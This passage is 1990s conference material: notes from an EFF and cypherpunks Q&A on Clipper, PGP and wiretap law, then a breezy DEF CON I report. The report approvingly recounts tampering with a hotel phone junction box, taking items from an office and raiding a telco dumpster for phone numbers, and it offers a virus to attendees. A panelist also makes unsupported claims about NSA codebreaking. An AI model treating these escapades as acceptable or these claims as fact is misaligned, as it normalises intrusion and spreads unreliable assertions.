experience, however, NSA is dominant, and NIST relies on them.

Q. How does GATT relate to the Clipper proposal

A. It&#039;s not dealt with in GATT.  There&#039;s no agreement on an international
standard.

Q. What&#039;s going on with PGP?

A. Pretty Good Privacy is the people&#039;s crypto.  It was independently
developed, and has been widely distributed for our information and
security.  There are two current controversies regarding PGP.  First is
whether it is subject to export controls, and second is its intellectual
property status.

Q. What facts do we have regarding the history of Clipper?

A. The project began during the Bush administration after AT&amp;T introduced
phones implementing DES, the Data Encryption Standard.  Clinton looked at
it early in his administration.  NSA pushed the program, and the staff
wanted to &quot;do something&quot;.  A worst-case scenario about the introduction of
Clipper is that it was leaked to the press, and the story about a study
was cooked up to cover the leak.  People might be surprised about how
little expertise and thought about issues goes on.  Policy makers operate
under severe time constraints, handling the crisis of the moment.  Most of
them are reasonable people trying to do the best thing under the
circumstances.  If we push certain ideas long enough and hard enough we
can affect the outcome.

Q. Following the _AMD v. Intel_ case, there&#039;s nothing stating you cannot
clone the Clipper chips to circumvent the law enforcement field, correct?

A. It&#039;s difficult to say.  The chips have not yet been delivered.  There
have been technical problems with the chip.  At NIST hearing a couple
weeks ago, Dorothy Denning revealed that she had reviewed the Skipjack
algorithm alone because the other four cryptographers selected to review
the algorithm were on vacation.  There&#039;s a certain degree of cynicism
because the government has said it will twist people&#039;s arms using its
purchasing power and the threat of prosecution to establish Skipjack as a
de facto standard.  EFF is trying to get AT&amp;T and Motorola to do
something.  Maybe the chip cannot easily be cloned.  John Gilmore wants to
see how easy it is to reverse engineer.

Q. What are specific steps that can be taken?

A. Send Email to the White House, and cc to EFF.  Also, focus on the
debate concerning ownership and leasing of the national information
infrastructure.  Southwestern Bell wants authority to own and lease the
net and isn&#039;t quite sure whether government should be involved.  This is
the other longest-running EFF policy concern:  the owner of the electronic
highways shouldn&#039;t be able to control content.  Bandwidth should be
provided based on the principles of common carriage and universal access.
Construction of the NII should be done by the private sector because
government doesn&#039;t have the resources available.  We can&#039;t allow ourselves
to be limited to upstream bandwidth.  The net should retain those of its
characteristics equivalent to BBS&#039;s.

Q. If NIST is to be an escrow agent, why are they not secure?

A. This is a source of moral outrage, but moral outrage only goes so far.
We need to swallow our distaste for dealing with the government to
compromise.  It is worthwhile to get involved in the decision-making
_process_.

Q. What is the position of the ACLU and Republican think tanks on Clipper?

A. A lot of organizations have bumped into NII.  ACLU is fighting the
Clipper chip.  For other organizations, it&#039;s not a top priority item.

Q. With regard to DES:  Export restrictions apply to scramblers, but they
are exported anyway.  Why this policy of selective enforcement?

A. Don&#039;t look for consistency.  SPA has recognized that there are 231 DES-
equivalent products.  The genie is out of the bottle.  DES source is
widely available, but more so inside the US than outside.

Q. If the government has their way, what good products are out there for
us?

A. The government can only have its way by mandating use of Skipjack.  If
it holds up, legally and politically, there _is_ no alternative.  The
government is saying that it is considering banning the use of crypto
other than Skipjack, but has not yet adopted such a policy.

Q. If crypto is a munition, is it protected under the Second Amendment?

A. The Second Amendment probably doesn&#039;t affect the export question.

Q. Are there any legal weaknesses in the public key cryptography patents?

A. EFF has its hands full with other issues and hasn&#039;t really formulated
an answer to this, but believes there&#039;s a fatal weakness as to all
software patents.  However, it would be prohibitively expensive to make
such a case at this time.

Q. Do we need different copyright laws because of encryption?

A. Recognize that without changes in the copyright law, it will be
difficult to get a true net economy going.  Producers want a way to make
money from the net.  Consumers want the equivalent of home taping.  It&#039;s
tough to cover all the bases.

Q. How do law enforcement issues in civil cases relate?

A. This is an interesting point because the line between a commercial
dispute and a criminal act are fuzzy.  There are dangers in obtaining a
wiretap.  The law enforcement community shouldn&#039;t have a case to tap a
line in the event of a two-party dispute.  There is a danger of misuse for
traffic analysis of calls.

Q. ECPA could have been used to regulate access to the airwaves.  Has it
been tested against the First Amendment?

A. This demonstrates that technological security measures, rather than
merely laws, are needed.  People have listened to cell phone calls with
scanners, and they made scanners illegal to manufacture, but cell phones
can be modified to act as scanners.  Experimentation of privacy with
encryption shifts the balance.  RSA is available outside the US.  RICO is
being overused.

PANEL #2:  INDUSTRIAL AND LEGAL ISSUES

Dyson - Beyond commercial people being citizens, there are three big
issues:

1. Protection of trade secrets
2. Intellectual property protection for net businesses and database
information
3. Exporting encryption devices: US businesses like to do business
overseas.  It is cost ineffective to develop a US-only standard.  There is
better encryption available in Russia and Bulgaria on BBS&#039;s.

Godwin - Talking about law enforcement arguments government makes.  There
are general issues regarding computers, communication, and privacy greater
than just Clipper.

     -- Godwin is the first person people talk to when they call EFF in
trouble.  In addition to giving a lot of general information regarding
liability, he monitors the intake of cases for EFF.  He talks at
conventions about criminal and constitutional issues.
     -- This effort has produced at least one change already:  law
enforcement personnel are no longer completely incompetent and clueless
about computers.
     -- the most interesting are issues dealing with hackers and crypto.
FBI&#039;s involvement with digital telephony:  they wanted to make it more
wiretap friendly.  They discovered it is worthless without a restriction
on encryption, and Clipper was introduced a short time later.

Legal History

     The right to communications privacy is a fairly new thing.  The
Supreme Court faced it in the 1928 _Olmstead_ case, and held that
there was no Fourth Amendment interest to be protected at all because
there was no physical intrusion on the property.  The doctrine has bee
reveisited a number of times since then.
     -- a suction cup mike next door to the defendant&#039;s apartment produced
the same holding.
     -- In a later case of a &quot;spike mike&quot; penetrating the heating duct of
the defendant&#039;s apartment, the Court held that the Fourth Amendment
applied but did not extend general Fourth Amendment protection.
     Finally in the _Katz_ case in the late 60&#039;s the Court formulated its
present doctrine in holding that the defendant has a reasonable
expectation of privacy in a phone booth.  The Court said that the Fourth
Amendment protects people, not places.  Justice Brandeis, in dissent,
cited Olmstead, but also noted that &quot;The right most prized by civilized
men is the right to be let alone.&quot;

Arguments regularly advanced by law enforcement types in favor of Clipper:

1. Wiretapping has been essential in making many cases.
     -- this argument seems reasonable.

2. Even if they can&#039;t point to a case now, they are taking a proactive
approach, trying to anticipate problems rather than reacting.
     -- Dorothy Denning was involved early on in framing the issues.  Now
she&#039;s in favor of the government line.  Point is that an attitude of &quot;us
vs. them&quot; is counterproductive.

3) There are nuclear terrorists out there
     -- this argument is the result of false reasoning.  Like Pascal&#039;s
wager, the price of guessing wrong is so high that the rational person
chooses to be a believer, even where the probability is very low.
     -- the problem with it is that you can&#039;t live that way.  There&#039;s not
necessarily one single right answer.  Also there is a substantial
opportunity cost.  Whenever you empower individual rights, there&#039;s a
tradeoff against government efficiency.  As an example, take the case of
compelled confession.  It would be very efficient for the government to be
able to compel a confession, but the cost in individual rights is too
high.  There is no constitutional precedent on which to base the outlawing
of encryption.  The way it ought to be, the law enforcement types should
have the right to try to intercept communications under certain
circumstances, but they should have no guarantee of success.

4) Wiretapping has created an entitlement to have access to the
communications:  this argument is blatantly ridiculous.

Q &amp; A

Q. Before the A-bomb was built, proponents said that it would cost $1
million to build.  The eventual cost was $1 billion.  Congress asked what
was the probability that it could work, and was told 1 in 10.  Thus the
nuclear terrorist argument works, right?

A. Terrorists won&#039;t use Clipper

Q. NSA has had scramblers working.  Why does it hurt for us to have the
devices?

A. We&#039;re not opening Pandora&#039;s Box.  Encryption is already out there.
They think the majority of communications are not encrypted now.
Encryption will create a bottleneck, which will change the way law
enforcement does its job.

Q. What about the Davis case in Oklahoma? If convicted is there any chance
for parole?

A. Davis was a BBS owner prosecuted because he allegedly had obscene
material on his board.  I don&#039;t know about Oklahoma parole law.

Q. What is the current legal status of PGP?

A. That will be answered later.

Q. If &quot;only outlaws will have crypto&quot;, how effectively can the clamp down?

A. It will probably be very easy for them to chill nonstandard crypto if
     -- they investigate for another crime and find it, or
     -- it may itself be probable cause for a search.

Q. Doesn&#039;t a lot of this boil down to &quot;you wouldn&#039;t be encrypting if you
had nothing to hide&quot;?

A. There&#039;s not any probable cause for law enforcement taking that
position.  Business likes crypto.  In a scenario where only certain types
of crypto are allowed, there could presumably arise a presumption from
nonstandard crypto.  The more people who encrypt, the more will say it is
all right.

Q. Do you get the sense that there is a political will to protect privacy
in this country?

A. It is not clear that is the case.  There is a real education hurdle to
teach the importance of technology.

Q. The law enforcement aspect is not important to NSA, right?

A. The Russians and the Japanese have done more theoretical work.  Read
&quot;The Puzzle Palace&quot;

Q. Virtual communities and net businesses need crypto on all systems to
validate digital signatures.

A. It is not required universally.  It will become cheaper as digital
signatures take off.  The Clipper proposal does not address digital
signatures.  NIST is also talking to IRS about helping implement Clipper
by extending the ability to file tax returns electronically to those using
Clipper.

Q. What restrictions are there right now on the IMPORT of crypto?

A. None right now.

Q. Is law enforcement misuse of commercial information anticipated?

A. It is a wash.  There are laws available to protect against such things,
like the Electronic Funds Transfer laws, and also that the wiretap law
requires eventual notification of the tap.  That&#039;s why they have called
for two escrow agents.  The weakness is that people can be compromised.
The answer to law enforcement is that you could have more than two escrow
agents to make the bribe prohibitively expensive.  Also the problem of
human weakness is not unique to the Clipper chip or key escrow systems.

Q. There&#039;s no mapping between the chip and the phone, correct?

A. The only link is the word of the officer seeking a warrant.  There is
no provision right now for a database containing identities of all chips.

Q. Can the President or Congress outlaw encryption by Executive Order?

A. The president cannot by Executive Order.  It&#039;s not clear whether
Congress could constitutionally.

Q. What about steganography?

A. Steganography is defined as a message appearing to be unencrypted but
containing a code.  There&#039;s a constant competition between the law
enforcement community and the criminal element to stay ahead on the
technology.

Q. Are one time pads illegal, or covered by export regulations?

A. No.  Few policymakers have ever heard of them.

Q. What&#039;s a vision of what we would like to see?

A. Try to give people a technological means to protect their own privacy.
Freedom to exchange information.  Communities conforming to a standard
without oversight, so that we can export.
Godwin - more mystical approach.  In person, you can be sure of someone&#039;s
identity.  This creates intimacy.  Technology has the potential to free
intimacy from the accident of geography.  With crypto, you know the
identity of the other person, and that you&#039;re not being overheard.

Q. Who are the law enforcement people you&#039;ve been dealing with?  Do they
represent the highest levels of their organizations?

A. (Godwin) I don&#039;t claim to know what NSA thinks.  I have talked to FBI,
state and local law enforcement authorities, and they all say the same
things.

PANEL #3:  CYPHERPUNKS

Barlow - Doesn&#039;t have the I/O bandwidth to be a cypherpunk.  Doesn&#039;t know
how they do it.  The net is the biggest technological development since
fire.  There&#039;s a very difficult choice to be made, and it may already be
made:  Either anything is visible to anyone who is curious, or nothing is
visible.  Barlow comes from a small town.  He&#039;s not bothered by privacy
invasions at that level.  But there&#039;s a difference between locals and the
possessors of a database.
     The problem of giving up privacy (which without encryption will
happen), is that it allows &quot;them&quot; to protect us from ourselves.  Also, no
matter how benevolent the current government may be, there will always be
a corrupt one down the road.  Hidden crypto economies could break most
governments.  It&#039;s not necessarily good to have no government either.
     What drives the cypherpunks is a law of nature:  Anarchy is breaking
out, and Barlow is one.  However, the libertarian impulse begs a few
questions about crypto: What are we trying to hide, from whom, and why?
     There are a lot of victimless crimes out there for which no one wants
to take responsibility.
     Barlow wants crypto to create trust in identity.  The real cypherpunk
question is:  The war is over, and we have won.  How do we make the
transition of power graceful?  Human nature is to acquire some power
structure of some kind.  It is critical to acquaint friends and those who
could care less with crypto.

Gilmore - There are too many laws, and they make the wrong things illegal;
We need to explain.  In the existing system, the natural outgrowth has
been for cypherpunks to be labeled as &quot;them&quot;.  Gilmore&#039;s vision is
unprecedented mobility by creating privacy and authenticity at a distance.
Thus you don&#039;t have to live near work, or play near home.  By focusing on
conspirators, the law enforcement community loses the focus on business
use.  The formal topic of the panel is cypherpunks.
     -- Crypto is not all that hard.  Denning&#039;s book shows how to
implement DES and RSA.
     -- Cypherpunks push the limits - taking cryptography from theory into
the realm of the practical.
     -- Trying to put crypto in the hands of the people, so that the
government cannot take it back.  That&#039;s why PGP is freely distributed.
     -- Also working on anonymity and digital money schemes.
The areas the cypherpunk group has worked on are:
     1) Anonymity - anonymous Email.  What is the impact on how we
communicate?  Most of the debate has been relatively uninformed.  The
Supreme Court thinks there is a right of anonymity.  A Los Angeles law
requiring that demonstrators who handed out flyers put their name and
address on the flyers was overturned on the grounds that it chilled free
speech.  In other media, telephones are anonymous.  There has been a big
ruckus with Caller ID.  The postal service does not enforce return address
requirements.  Telegrams and radio are similarly anonymous.
     2) Privacy - Have been implementing key exchange systems for PGP,
experimenting with encrypted audio.  Digital cash systems - so many
businesses would pop up on the net if it was possible to spend electronic
money.  There are people working on the legal aspects of it now.
     3) Outreach - a mailing list, contributing articles to Village Voice,
Wired, Whole Earth News.
     4) Government interaction - Sent a list of questions regarding
Clipper to NIST.  Made several requests under the Freedom of Information
Act.  Someone searched the dumpsters at Mykotronx.  In a recent FOIA
request to an Assistant Secretary of Defense, we learned that the law
enforcement and intelligence communities advocate making Clipper
mandatory.  There&#039;s a FOIA request in now on Clipper.  FBI returned a
clipping file, but says it will take 3 1/2 years to process and release
all the documents requested.
     5) Future projects - Building encrypted phones using PGP.  Real
digital banking.  Automating anonymity and making an easier to use
interface for anonymized mail.  Tightening security from machine to
machine protocols - Right now they transmit cleartext.  At Gilmore&#039;s home
machine at Cygnus recently, a hacker monitored a session remotely, then
installed a daemon to monitor the first 200 bytes of ethernet traffic from
each connection.  The daemon was removed, and the problem fixed using
kerberos.

Hughes - Cypherpunks was created by Hughes and Tim May.  It&#039;s surprising
how much media attention we have gotten.  They knew what they were doing
was significant, but not that so many people thought so.  They are now
shooting a pilot for a TV show based on cypherpunks, and Hughes has held
himself out as a media expert.  Here are a few obvious things that
nonetheless need to be stated:

     1) In order to have a private key, you need to have your own CPU.  To
put your key online where someone else has physical access is dumb.
Therefore, one of the consequences is that digital privacy is only for the
rich.
     2) Cypherpunks is not a &quot;hacker privacy league&quot;, but rather seeks to
ensure privacy for all.  Crypto must be easy to use.  It is just now
feasible to have an anonymous remailer.  The user interface _must_ be
easy.  The layperson&#039;s concept of security is that if the computer is not
networked, it is secure.  They don&#039;t see how much of a disadvantage it is
not to be networked.  Gibson calls non-networked computers &quot;dead silicon&quot;.
Therefore, encryption needs to be transparent to the user.  The
cypherpunks mailing list reached critical mass about 2 months ago with
enough people understanding the concepts to move forward.  We&#039;re at a
crossroads historically now.
     3) If you&#039;re the only one using crypto, it must be you who sent the
cryptographic message.  Anonymity is a social construct, and it doesn&#039;t
work unless many people do it.  The government is good at suppressing
small things, but bad at suppressing big things.  Therefore the best
course of action is to spread the word.  In the end, most of us will be
private or most will not.  If encryption is available to you, use it.

In response to Dyson on the question of copyright:  Copyright is dead, or
at least moribund.  It will not exist as we know it in 100 years.  It is
a means of using the government&#039;s power to suppress expression.  You still
will be able to sell the timeliness of information, indexing, delivery,
etc.

Gilmore - If we decide to be private, the only limit to secrecy is
individual conscience.

Comments from the audience:

     -- As it becomes less possible to hold on to information, marketing
shifts toward a relationship rather than a product.
     -- If we want to make encryption easy, put out a mailer which
supports it.  (Response: We&#039;re working on it)

Q &amp; A

Q. Can public keys be made available through the Domain Name Servers?

A. PGP developers are working on it.  Internet is an information motel.
Data checks in, but it doesn&#039;t check out.

Q. Is it possible to keep secrets at all?

A. The larger an organization is, the tougher it is to keep a secret.
Secrecy and digital signatures are not exactly related.  One thing we may
see if pointers to specific documents which contain self-verifying
information.  These will change the balance of power.

Q. Can we sell strong crypto to Clinton as part of his national ID card
for health care program?

A. There&#039;s a problem in dealing with the administration right now, because
they are currently defending a position and it will be tough to change.
A parallel development may make the difference.  Congress is getting
Email.  Seven or eight congressmen have access.  A push to implement
crypto to determine who is from the districts represented should come
soon.  A lot of this type application is based on the blind signature work
of David Chaum.

Q. What&#039;s the status with the legality of PGP vs. RSA?

A. It is unsettled.  There are two issues: patent infringement and export.
RIPEM uses RSAREF, which is a watered down version of RSA.  They&#039;re
working on PGP using RSAREF for noncommercial users.

Q. Compare the strength and security of PGP and RIPEM?

A. PGP uses a longer key.  RIPEM uses DES, but will probably go to Triple-
DES.

Q. How are blind signatures used?

A. Voter cards, digital signatures, digital money.  The government won&#039;t
do it if they feel it&#039;s not in their best interest.  Push it.

Q. Can NSA break DES &amp; PGP?

A. Of course.
Q. How long must a key be to slow NSA down?

A. We estimate they can break one 512 bit RSA modulus per day.

Q. Is PGP illegal, and if so, how?

A. Patent infringement issue is whether PGP infringes RSA.  If you use a
product that infringes, you are civilly liable.  If they were to enforce
against a random user, worst case is that the user might be tied up in the
courts for a while.  Worse is copyright - it is a felony to engage in
software piracy, which means making over 10 copies with a value over
$2500.  This poses a potential problem for sysadmins, and now companies
use the threat of criminal charges to force licensing.  Kapor is willing
to take the case of whether or not there could ever be a valid software
patent to the Supreme Court.  Godwin says prosecutors will use other laws:
Wire fraud, conspiracy, RICO.

Hughes - there should be a local cypherpunks chapter.  It should meet on
the second Saturday of the month.  Hughes is pursuing the idea of
teleconferencing.

Hughes concludes: &quot;There&#039;s plenty of arguing to do.  I&#039;ll see you online.&quot;

xxxxxxxxxxxxxxxxxx xxx xx x  xx              DEF CON I, Las Vegas 1993
xxxxxxxXXXXxxxxxxxxxxxxx xx  x x          I&#039;ll attempt to give you guys
xxxxxxXXXXXXxxxxx x   x     x        the real deal on what happened.  Since you
xxxxxXXXXXXXXxxxxx xx   x x          most likely don&#039;t care about the whole
xxxxXXXXXXXXXXxxx x  xxxxxxxx x      planning side of it I&#039;ll just talk about
xxxXXXXXXXXXXXXxxxxxxxxxx  x         what happened of interest.
xxXXXXXXXXXXXXXXxxxxxx   xx   x
xxxXXXXXXXXXXXXxxxxxxxx              I showed up at the Sands Hotel later than
xxxxXXXXXXXXXXxxxxxxxx  x x  xx      I thought, thanks to a delay at the
xxxxxXXXXXXXXxxxxxxx xxx   xx  x     airport and a ride on the slowest hotel
xxxxxxXXXXXXxxxxxxx x x  x           shuttle known to mankind.  It had to stop
xxxxxxxXXXXxxxxxxxxxxx xx x x        at every other hotel before it made it to
xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx x     mine.  Oh well.

    So I check in and go to check out the conference room, which happens to be
right next to the conference planning room for the hotel.  &quot;Hmm, they will be
gone for the weekend though, so we should be safe,&quot; I think as I wander into
&quot;The Burgundy Room&quot;  Sounds like a room in &quot;Clue.&quot;  Anyway there are like maybe
six other people there.  Dead Addict has been holding down the fort, and wanted
to go get drinks so I set him free to frolic as I set up shop.  I handed out
tags to the people who had shown up and settled in for the duration.

    Someone had brought a cd player, so I put on a tape and got the music
going.  Red Five was there sporting scanners and radio gear, this guy had wires
sticking out all over the place.  &quot;Good thing they turned to phones off,&quot; I say
looking around the room happy that I wouldn&#039;t be stuck with a $31,312 phone
call to Eastern Europe.  &quot;Yeah, we already checked that one,&quot; said one of the
&quot;hammies&quot; gesturing to the phone jack I had seen.  I notice a large cable
running from the jack to a larger junction box at about the same time their
eyes light up with glee.  &quot;Get the handset!,&quot; one says as another advances on
the box with a tool kit that appeared out of thin air.  &quot;I&#039;ll need the ohm
meter and some clips.&quot;  the box is dismantled, and three people swarm it in
a line testing frenzy.  &quot;No good on one.. two.. three.. got tone on four!&quot;
Great, I think, I&#039;m fucked!  &quot;hhmm.. seems to be just the hotel, can&#039;t get an
outside line..&quot;

    This goes on for some time until I persuade them to stop fucking with the
box and to do something else.  They give up bored, and start exploring the
rooms next to us finding a hallway that leads to a security camera monitoring
the casino tables below.  Some decide it&#039;s not cool to be recorded and return
from there in a hurry, while others locate a travel agent&#039;s office and start
grabbing a few things of no consequence.  We grabbed two large easels holding
large pads of paper for people to draw/write on.

    About this time the lady in charge of convention planning calls me to her
office.  &quot;We got a call from the communications room.  They said things were
lighting up on their board that aren&#039;t supposed to be lighting up from your
conference room.  They say if it doesn&#039;t stop that you&#039;ll be thrown out of the
hotel.&quot;  Zowie.  &quot;OK, I got them to stop.  They were just trying out their
computer on the phone line to see if they could place a call,&quot; (Yeah, right)
&quot;but I&#039;m sure it won&#039;t happen again.&quot;  The assistant in the office spoke up
and said something like, &quot;Well, if you can clear my credit card I&#039;m sure we
wouldn&#039;t mind!&quot; To which the main lady, Moreen, said &quot;Yeah, my name is Moreen
Robinson, and my Social Security number is...&quot;  What did they think?  &quot;Yeah,
I&#039;ll get my credit erasers on it right away!&quot;??

    Back at the room things started to pick up.  People came in throughout the
day, and the bar downstairs was having a $1 margarita special.  Someone bought
twenty drinks for everyone (All right!) and then we got a picture more of them.
Metal Head went and got me a drink while he was out.  Things were looking good
through this buzz of mine.  Judi Clark of the Bay Area CPSR showed up (one of
the speakers) and was real cool.  She was jonesing for an internet connection,
but we couldn&#039;t line one up with a slip connection for her.  She had brought
some literature to distribute, too.

    Around six or seven or so we had a pretty good crowd going, with more and
more speakers showing up.  Ray Kaplan (Kaplan and Associates) drove like a
maniac out of Arizona, and Dr. Ludwig (Author of Little Black Book of
Computer Viruses) drove up with Merc from Arizona also.  It was about ten or
so Friday night and people were getting to know each other.  Some more radio
guys showed up, including the Jackal, and they were in another corner speaking
in some other language.. stuff I won&#039;t even try to reproduce here.  It revolved
around the best ways to pick up restricted channels and how not to be
triangulated.  Cool.

    Speculation was rising about what Gail Thackery would be like, and when
Gillian from New Media Magazine showed up to cover the event people figured
that she must be Gail.  Nope.  Gail showed up about a half hour later.
Conversation in the room stopped, and all eyes were on Gail.  She didn&#039;t seem
to notice, and came up and said hello.  I gave her a speakers id pass, and
she went off to find a drink.  When she returned people started to talk to her,
and by about midnight she was mobbed with people.  She had a captive audience
at the back of the room and was fielding all types of questions.  Some guy was
saying &quot;Say, hypothetically, that you have 9 gigs all encrypted on your, re,
a bbs and you get raided, wow will they get the evidence?&quot;  Gail&#039;s response
was basically if they have enough evidence to boot in your door they should
have enough evidence to prosecute a case.  Want to be a test case for
encryption?  Neither did he.

    Kurt Karnow, the VR speaker from San Francisco showed up and was talking
with the New Media Reporter.  Some local radio d.j. who does a late night
cutting edge style showed up to grab some audio clips from me and bailed out.
A &quot;suit&quot; showed up, and everyone immediately, in an attempt to win the free
&quot;I spotted the fed&quot; shirt pointed him out to me.  This &quot;suit&quot; had cop eyes,
cop walk and cop speak.  He was all businesslike, and wanted to talk to me
in private.  I took him into the &quot;cone-o-silence&quot; room (the hallway connected
to the travel agent&#039;s place) and asked what&#039;s up.  Turns out he is a writer
for Loompanics and was there checking to see if there was anything or anyone
worth writing about or having write for him.  Everyone was sure I was a super
narc after coming out of the cone, but he started loosening up and was talking
with everyone by the next day.  If he was a fed, they have great feds out there
that are almost undetectable.  He said his cop speak is a great way to get
people to tell him stuff they wouldn&#039;t normally say.

    Dan Farmer showed up with a female harem in tow.  He seemed to have this
ability to magically attract females, but we won&#039;t get into that here.  He
would make an appearance and then leave every once in a while.  His women
looked bored (there were three of them) so I assume he was keeping them
entertained by gambling or something...

    Dark Druid showed up with Richard Finch, an author who is writing a book
entitled &quot;The underground road map through cyberspace&quot;  Oh, yeah.  This guy
still owes me a copy of the video tapes from the convention.  Basically a
snake.  Said he would send me a copy of them, and then moved and changed his
number.  We located him and he said he would send them again.  Not.  L00zer.
Dark Druid was cool, though, and was franticly looking for alcohol to comfort
him after the long drive.

    One person I met worked for Logicon, SOF Weapon Systems, doing &quot;Nuclear
event testing.&quot;  Basically his job is to see if he can break in and cause a
simulated &quot;event&quot; (missile launch, detonation, etc.) to happen.  I&#039;ll invite this
guy to speak at DEF CON ][ for sure.  Not that people are going to hack silos,
but it was very interesting to say the least.

    It was decided it was time for a &quot;Death Star&quot; raid (we had spotted the
local AT&amp;T office with a billion repeaters and microwave shit on the roof)
and rounded up a crew to go attack it.  Of course Red Five was standing by
(Ow!) and Gillian offered to rent a limo to go trashing in.  It turned out
that it would take 1/2 hour to get the limo, so we went in two cars instead.
After getting lost in the Las Vegas Hell we found the target.  Fences
everywhere, a guard patrolling, and an unprotected dumpster just by the
fences.  Red Five radioed to his friend, we coordinated an attack plan.  I
laid down flat in the back of the truck, another car was &quot;blocker&quot; on the
street.  We turned in, screeched up to the treasure chest, I bailed out and
hurled the bags into the truck and pounced on top of them to the papers
wouldn&#039;t fly out as we hauled ass outta there.  Those Vegas telco employees
eat more dino-sized McMeals and burgers than I can count.  My body was almost
covered in apple pie containers and happy meals, yuck.  We hauled the find up
to the room, and the people who were still up dived on it.  Jamin the Shamin
went bonkers rooting through crap, and I think White Ninja was sportin&#039; wood.
People got some interesting items (catalogues, some x.25 phone numbers, etc..)
while I got to clean up the mess, er, wreckage in the room.  Everyone pitched
in and by two thirty a.m. it was time to snooze.  Everyone took off to wherever
they were going, and a few people stuck around to crash in the conference room.

    It seems over the night that the late shift of security personnel were not
informed that I had the conference room 24 hours.  They showed up at around
four a.m. and saw Code Ripper, The Prophet and Merc crashed out and they went
nuts.  At first they asked them to leave to room.  The Prophet explained that
the room was rented 24 hours, and they didn&#039;t care.  He then asked to talk to
the assistant manager.  They didn&#039;t like this and called in the goons.  Like
five or more guards showed up.  In Las Vegas the goons carry guns.  These guys
asked to have &#039;em leave and Code Ripper and Merc were like &quot;Sure, no prob.
Later!&quot;  The Prophet continued to bitch and got a personal interview with head
guard man and then a personal boot off the hotel&#039;s property.

    Saturday morning I get a fax that Allen Grogan (Editor of the Computer
Lawyer) won&#039;t be able to make it because of a family emergency.  That&#039;s one less
speaker.  Already Count Zero&#039;s dad went ballistic when he found out his son
might speak at the con.  He threatened to sue me if he showed up.  Dude, chill,
it&#039;s your son, not mine.  It turns out he called the Sands Hotel ranting and
raving at anyone he could.  Moreen said, &quot;he was spouting off things about law
suits and some such, so I transferred him to legal.&quot;  What a kook.  Midnight
Sorrow (used to run CCi) backed out too after his phone bills reached like
half of the national debt.  ErikB spent too much money at SCon and he bailed
out also.  They were dropping like flies!  Scott Simpson wasn&#039;t about to show
up after his door was kicked in with the help of various federal agencies,
either.  Oh well, we still had a full speaking list.

    Robert X. Cringly from Info World was there, a photographer from Mac World,
John Littman, Unix World (&lt;- an evil review.. don&#039;t believe it.. it was all
wrong and jumbled.  Rik Farrow messed it up) another photographer who took the
picture that ended up in New Media was there.  The photographer (Who turned
out to be Karnow&#039;s sister) gathered some &quot;cyberpunk&quot; looking people together
for it.. needless to say I wasn&#039;t in it.  She bought a bunch of alcohol for
everyone, so that wasn&#039;t so bad.

    I did a little blurb welcoming everyone and talking about my run in at the
Seattle 2600 meeting a few weeks before, and then let Ray K. start off the
convention.  About halfway through the talks before lunch, the X. Cringe factor
got a cellular phone call, and got up to leave the room so as not to disturb
the audience.  He was about halfway towards the door when you could hear
scanners turning on all over the room (well, OK, three of them) and a
coordinated effort was put forth to find his call.  Some start at the low
frequencies and worked up, and some at the high frequencies and worked down.
It turns out it was only Pammy, and no super secret industry gossip.  Bummer.

  I&#039;m not going to cover exactly what the speakers had to say because I wouldn&#039;t
know what to include and what not too.  Get the tapes, or ftp the huge
digitized speeches off the ftp site (cyberspace.com /pub/defcon) and listen
to &#039;em.  We tried to make typed transcripts, but they were a nightmare, so we
gave up on it.  This is basically what was covered:

     Ray Kaplan did a verbal sample of the attendees, and then went on to talk
about morality and the hacking ethic.  He came across pro-responsible-hacker,
but managed to get into a debate with Torquamada who though he was preaching
too much.  A good exchange, and his talk reminded me of some of the stuff you
hear on IRC late at night when #hack becomes #hack-politics, only better.

     Gail Thackery spoke about where the law is coming from in all this, and
was very straight forward with a no shit attitude.  She said she loved
capturing and collecting all the log in screens of bbs systems that have lame
disclaimers like &quot;If you are a fed you can&#039;t log on here.  If you press &#039;y&#039;
you can never narc on me.&quot;  She swaps &#039;em with her other law enforcement
friends.  As a side note we were selling hack pads and bbs pads that attempted
to organize all the notes people make in the course of things.  It seems every
one who gets nabbed gets nabbed with their &quot;bust-me book&quot;  You know, that
note pad with all the incriminating evidence on it that everyone keeps.  Well
we figured we&#039;d at least make things easier so we had these pads.  Gail looked
them over and made a comment like, &quot;Oh, those look just like ours except we
have a space for the case number in the upper right hand corner.&quot;

     Judy Clark from the CPSR spoke about the role of the CPSR (Computer
Professionals for Social Responsibility) as opposed to that of the EFF which
is almost entirely, well, er, it is, sponsored by large corporations including
computer and telephone interests.  She spoke about privacy issues and what to
do if you are interested in getting involved.

     There was a panel discussion with Gail and Ray K fielding questions from
the audience.  Ray talked about how security is useless unless the employers
and employees are willing to change their way of working.  It&#039;s not as simple
as installing the latest and greatest security packages.

     Kurt Karnow works as an attorney for a San Fransisco law firm that
represents large companies such as AT&amp;T and Sega.  He spoke about &quot;ZUI&quot; or
Zero User Interface as envisioned in the future with VR equipment.  He talked
about how impossible it is to  debug any large program 100%, and that mistakes
and problems will occur.  He talked of a recent case he worked on, where the
makers of &quot;Sim City&quot; made &quot;Sim Oil Refinery&quot; for a large oil company.  The
company was concerned that if their software was programmed incorrectly, and
they find that out by having a refinery explode when the employees did
something they were trained to do, that they could loose all.  Kurt was also
great is shamelessly hoping some for a few good accidents so he could finance
his kids through college.  A very well informed and easy to talk to person.

     Dr. Mark Ludwig Spoke about the philosophy behind his virii programming
analysis.  It was almost a political talk about the invasive government
policies and the desire of the Federal System to be the know all and be all
in the future.  He spoke about their attempts to restrict encryption
technologies.  He announced that he has come up with a virus that acts as a
software delivery service for the IDEA encryption algorithm.  When you
insert this disk, or get the &quot;infection&quot; it asks if you want to encrypt your
fixed disk, and then asks for your password.  Any floppy that is inserted on
your system gets encrypted and infected with the password of your choice.
You can toggle the encryption on and off, un-install your hard drive, etc.  He
posed the question to the crowd, &quot;What if everyone woke up one day and all
their data was safely encrypted?  If encryption became the standard, people
would have less to fear from Big Brother.&quot;  I&#039;ve got the virus, called the
KOH virus, currently being updated, and will bring it to Pump Con ][, Ho Ho,
Etc. for anyone interested.

     Dead Addict spoke on the past and the future as he sees it of the Computer
Underground&#039;s various factions.  The increase of people on the net and the use
of more and more networks will yield rich lands to be explored.  It turned
into a question and answer with people discussing their view on where things
are going.

     Dan Farmer spoke on Unix security.  He was very good and sounded very well
informed.  He has learned his tricks monitoring the 30,000 or so workstations
used by Sun Microsystem and else where over the years.  He talked about how
people get caught and what to do about it.  How sysadmins usually monitor and
maintain their systems.  Basically he was bored with password crackers and lame
passwords.  He focused on the creative ways to get root.  &quot;If you can gain
access enough to execute one command on the victim computer, you should be able
